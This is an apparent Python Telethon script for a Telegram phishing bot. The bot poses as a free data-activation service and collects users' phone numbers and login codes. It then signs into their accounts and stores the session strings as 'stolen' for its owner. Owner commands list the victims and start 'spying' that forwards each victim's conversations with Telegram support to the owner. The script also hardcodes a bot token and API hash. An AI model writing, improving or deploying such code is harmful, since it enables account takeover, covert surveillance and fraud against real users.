import asyncio
import json
from pathlib import Path
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession

# ========== بياناتك ==========
BOT_TOKEN = "8704404185:AAGe_I8kcY4qtbpzVLxpTc2seLrPHHKLsvE"
API_ID = 38269251
API_HASH = "af81ddbd39ca658e08bf7c268d6651c7"
OWNER_ID = 5843701757

BASE_DIR = Path("/storage/emulated/0/Download/bot_sessions")
BASE_DIR.mkdir(exist_ok=True)
SESSION_FILE = BASE_DIR / "sessions.json"

user_data = {}
stolen = {}
active_spies = {}  # للتجسس

if SESSION_FILE.exists():
    with open(SESSION_FILE) as f:
        stolen = {int(k): v for k, v in json.load(f).items()}

bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

USER_MSG = "🌐 *Dz Quantum Net*\n🎁 خدمة تفعيل 2GB مجاني\n@Dz_off_bot"

# ========== أوامر الموقع (نفس الكود الناجح) ==========
@bot.on(events.NewMessage(pattern='/verify'))
async def verify(event):
    try:
        phone = event.text.split()[1]
        if not phone.startswith('+'): phone = '+' + phone
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        user_data[event.sender_id] = {'phone': phone, 'client': client}
        await event.reply(f"✅ تم إرسال الرمز إلى {phone}")
    except Exception as e:
        await event.reply(f"❌ {str(e)[:100]}")

@bot.on(events.NewMessage(pattern='/submit_code'))
async def submit(event):
    sid = event.sender_id
    if sid not in user_data:
        await event.reply("❌ أرسل /verify أولا")
        return
    try:
        code = event.text.split()[1]
        client = user_data[sid]['client']
        phone = user_data[sid]['phone']
        await client.sign_in(phone=phone, code=code)
        me = await client.get_me()
        session_str = StringSession.save(client.session)
        stolen[me.id] = session_str
        with open(SESSION_FILE, 'w') as f:
            json.dump({str(k): v for k, v in stolen.items()}, f)
        await event.reply("✅ تم التفعيل بنجاح")
        if sid != OWNER_ID:
            await bot.send_message(OWNER_ID, f"🔥 اختراق: {me.first_name} ({me.id})")
        await client.disconnect()
        del user_data[sid]
    except SessionPasswordNeededError:
        await event.reply("🔐 محمي بـ 2FA")
        del user_data[sid]
    except Exception as e:
        await event.reply(f"❌ {str(e)[:100]}")
        del user_data[sid]

# ========== أوامر المالك (نفس الكود الناجح) ==========
@bot.on(events.NewMessage(pattern='/owner'))
async def owner_menu(event):
    if event.sender_id != OWNER_ID: return
    await event.reply("""👑 أوامر المالك:
/list - عرض المخترقين
/session ID - عرض جلسة
/stats - إحصائيات
/spy ID - تجسس حقيقي
/stop_spy ID - إيقاف التجسس
/verify +213XXX
/submit_code 12345""")

@bot.on(events.NewMessage(pattern='/list'))
async def list_cmd(event):
    if event.sender_id != OWNER_ID: return
    if not stolen:
        await event.reply("📭 لا توجد حسابات")
    else:
        msg = "📋 المخترقين:\n"
        for vid in stolen:
            active = " 🎧" if vid in active_spies else ""
            msg += f"• {vid}{active}\n"
        await event.reply(msg)

@bot.on(events.NewMessage(pattern='/session'))
async def session_cmd(event):
    if event.sender_id != OWNER_ID: return
    try:
        vid = int(event.text.split()[1])
        if vid in stolen:
            await event.reply(f"جلسة {vid}:\n{stolen[vid][:80]}...")
        else:
            await event.reply(f"❌ {vid} غير موجود")
    except:
        await event.reply("❌ /session 5843701757")

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if event.sender_id != OWNER_ID: return
    await event.reply(f"📊 مخترقين: {len(stolen)}\n🎧 تجسس نشط: {len(active_spies)}\n📁 {BASE_DIR}")

# ========== وظائف التجسس الحقيقية ==========
SUPPORT_IDS = [777000, 777100, 777200, 4244000]
SUPPORT_NAMES = ["telegram", "telegramtips", "support", "smilesbot"]

async def start_spying(victim_id: int):
    """بدء تجسس حقيقي على حساب مخترق"""
    if victim_id in active_spies:
        return False
    if victim_id not in stolen:
        return False

    session_str = stolen[victim_id]
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()

    # التحقق من صحة الجلسة
    try:
        me = await client.get_me()
        if me.id != victim_id:
            await client.disconnect()
            return False
    except:
        await client.disconnect()
        return False

    # مستمع التجسس
    @client.on(events.NewMessage(incoming=True, outgoing=True))
    async def spy_listener(event):
        try:
            chat = await event.get_chat()
            is_support = False
            support_name = None

            # هل هي محادثة دعم فني؟
            if hasattr(chat, 'id') and chat.id in SUPPORT_IDS:
                is_support = True
                support_name = f"ID_{chat.id}"
            elif hasattr(chat, 'username') and chat.username and chat.username.lower() in SUPPORT_NAMES:
                is_support = True
                support_name = f"@{chat.username}"
            elif hasattr(chat, 'first_name') and "telegram" in chat.first_name.lower():
                is_support = True
                support_name = chat.first_name

            if not is_support:
                return

            direction = "📤 أرسل" if event.out else "📥 استلم"
            text = event.text[:300] if event.text else "[وسائط]"

            await bot.send_message(
                OWNER_ID,
                f"🔵 *رسالة دعم*\n👤 ضحية: {victim_id}\n{direction} مع {support_name}\n\n📝 {text}"
            )
        except:
            pass

    active_spies[victim_id] = client
    return True

async def stop_spying(victim_id: int):
    """إيقاف التجسس"""
    if victim_id in active_spies:
        try:
            await active_spies[victim_id].disconnect()
        except:
            pass
        del active_spies[victim_id]
        return True
    return False

@bot.on(events.NewMessage(pattern='/spy'))
async def spy_cmd(event):
    if event.sender_id != OWNER_ID: return
    try:
        victim_id = int(event.text.split()[1])
        if victim_id not in stolen:
            await event.reply(f"❌ {victim_id} غير مخترق")
            return
        if victim_id in active_spies:
            await event.reply(f"⚠️ التجسس على {victim_id} نشط بالفعل")
            return

        await event.reply(f"🔄 بدء التجسس على {victim_id}...")
        success = await start_spying(victim_id)
        if success:
            await event.reply(f"✅ تم بدء التجسس على {victim_id}")
        else:
            await event.reply(f"❌ فشل بدء التجسس")
    except:
        await event.reply("❌ /spy 5843701757")

@bot.on(events.NewMessage(pattern='/stop_spy'))
async def stop_spy_cmd(event):
    if event.sender_id != OWNER_ID: return
    try:
        victim_id = int(event.text.split()[1])
        if await stop_spying(victim_id):
            await event.reply(f"✅ تم إيقاف التجسس على {victim_id}")
        else:
            await event.reply(f"❌ لا يوجد تجسس نشط على {victim_id}")
    except:
        await event.reply("❌ /stop_spy 5843701757")

# ========== رد المستخدم العادي ==========
@bot.on(events.NewMessage)
async def normal_user(event):
    if event.sender_id == OWNER_ID:
        return
    if event.text and event.text.startswith('/verify'):
        return
    if event.text and event.text.startswith('/submit_code'):
        return
    await event.reply(USER_MSG, parse_mode='markdown')

# ========== التشغيل ==========
print("=" * 50)
print("🚀 البوت شغال - مع تجسس حقيقي")
print(f"👑 المالك: {OWNER_ID}")
print(f"📁 حفظ الجلسات: {BASE_DIR}")
print("=" * 50)

bot.run_until_disconnected()
~ $
